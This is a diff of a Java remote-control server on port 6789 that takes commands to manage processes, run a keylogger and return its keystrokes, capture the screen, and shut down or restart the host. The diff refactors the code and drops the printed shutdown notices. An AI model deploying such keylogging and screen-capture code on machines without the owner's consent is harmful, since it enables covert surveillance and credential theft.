@@ -19,15 +19,8 @@ public class Main {
 	
 	public static void main(String[] args) throws IOException {
 		GlobalScreen.setEventDispatcher(new SwingDispatchService());
-		int port = 6789;
-		try {
-            Server.server = new ServerSocket(port);
-            Server.client = Server.server.accept();
-            Server.in = new BufferedReader(new InputStreamReader(Server.client.getInputStream()));
-            Server.out = new BufferedWriter(new OutputStreamWriter(Server.client.getOutputStream()));
-        } catch (Exception e){
-        	
-        } 
+		
+		Connect();
 		
 		boolean isRunning = true;
 		while (isRunning)
@@ -42,7 +35,6 @@ public class Main {
 				else if(msg.equals("STOP_APP") || msg.equals("STOP_PROCESS")) Stop();
 				else if(msg.equals("LIST_APP")) List("APP");
 				else if(msg.equals("LIST_PROCESS")) List("PROCESS");
-				else if(msg.equals("DISCONNECT")) isRunning = false;
 				else if(msg.equals("HOOK")) Hook();
 				else if(msg.equals("UNHOOK")) Unhook();
 				else if(msg.equals("SHOW TEXT")) Showtext();
@@ -50,6 +42,7 @@ public class Main {
 				else if(msg.equals("SHUTDOWN")) Shutdown();
 				else if(msg.equals("RESTART")) Restart();
 				else if(msg.equals("SLEEP")) Sleep();
+				else if(msg.equals("DISCONNECT")) isRunning = false;
 				else if(msg.equals("EXIT")) isRunning = false;
 				else isRunning = false;
 				
@@ -67,7 +60,27 @@ public class Main {
 		}
 	}
 	
-	// START ======================================================================================
+	
+	
+	// CONNECT ====================================================================================
+	
+	private static void Connect() {
+		int port = 6789;
+		try {
+            Server.server = new ServerSocket(port);
+            Server.client = Server.server.accept();
+            Server.in = new BufferedReader(new InputStreamReader(Server.client.getInputStream()));
+            Server.out = new BufferedWriter(new OutputStreamWriter(Server.client.getOutputStream()));
+        } catch (Exception e){
+        	
+        } 
+	}
+	
+	
+	
+	// APPLICATION + PROCESS ======================================================================
+	
+	// START -----------------------------------
 	private static void Start() {
 		String nameApp = null;
 		try {
@@ -84,7 +97,7 @@ public class Main {
 		}
 	}
 	
-	// STOP =======================================================================================
+	// STOP ------------------------------------
 	private static void Stop() {
 		String msg = null;
 		try {
@@ -105,7 +118,7 @@ public class Main {
 		}
 	}
 	
-	// LIST =======================================================================================
+	// LIST -------------------------------------
 	private static void List(String type) throws IOException, InterruptedException {
 		Process process;
 		
@@ -160,16 +173,21 @@ public class Main {
 	}
 	
 	
-	private static void Hook()
-	{			
+	
+	// KEYSTROKE ==================================================================================
+	
+	// HOOK ----------------------------------------
+	private static void Hook() {			
 		keyLog.KeyLogger(keyLog);
 		
 	}
 	
+	// UNHOOK --------------------------------------
 	private static void Unhook() {
 		keyLog.UnKeyLogger(keyLog);
 	}
 	
+	// SHOW TEXT -----------------------------------
 	private static void Showtext() {
 		try {
 			Server.out.write(keyLog.keylog);
@@ -179,6 +197,10 @@ public class Main {
 		} catch (IOException e) {
 		}		
 	}
+	
+	
+
+	// CAPTURE ====================================================================================
 	
 	private static void Capture() {
 		BufferedImage image = null;
@@ -195,6 +217,11 @@ public class Main {
 		}
 	}	
 	
+	
+	
+	// POWER ======================================================================================
+
+	// SHUTDOWN ----------------------------------
 	private static void Shutdown()
 	{
 		Runtime runtime = Runtime.getRuntime() ;
@@ -206,7 +233,6 @@ public class Main {
 		}
 	    try
 	    {
-	       System.out.println("Shutting down the PC after 10 seconds.");
 	       runtime.exec("shutdown -s -t 10");
 	    }
 	    catch(IOException e)
@@ -214,9 +240,11 @@ public class Main {
 	    }
 	}
 	
-	
-	private static void Restart() {
+	// RESTART -----------------------------------
+	private static void Restart() 
+	{
 		Runtime runtime = Runtime.getRuntime() ;
+
 		try {
 			Server.server.close();
 			Server.client.close();
@@ -225,14 +253,14 @@ public class Main {
 		}
 	    try
 	    {
-	       System.out.println("Restarting the PC after 10 seconds.");
-	       runtime.exec("shutdown -r -t 10");
+	    	runtime.exec("shutdown -r -t 10");
 	    }
 	    catch(IOException e)
 	    {
 	    }
 	}
 	
+	// SLEEP --------------------------------------
 	private static void Sleep() {
 		Runtime runtime = Runtime.getRuntime() ;
 		try {
@@ -243,8 +271,9 @@ public class Main {
 		}
 	    try
 	    {
-	       System.out.println("Sleep the PC after 10 seconds.");
-	       runtime.exec("Rundll32.exe powrprof.dll, SetSuspendState Sleep");
+	    	//Runtime.getRuntime().exec("powershell -command \"Rundll32.exe powrprof.dll, SetSuspendState Sleep");
+
+	    	runtime.exec("Rundll32.exe powrprof.dll, SetSuspendState Sleep");
 	    }
 	    catch(IOException e)
 	    {
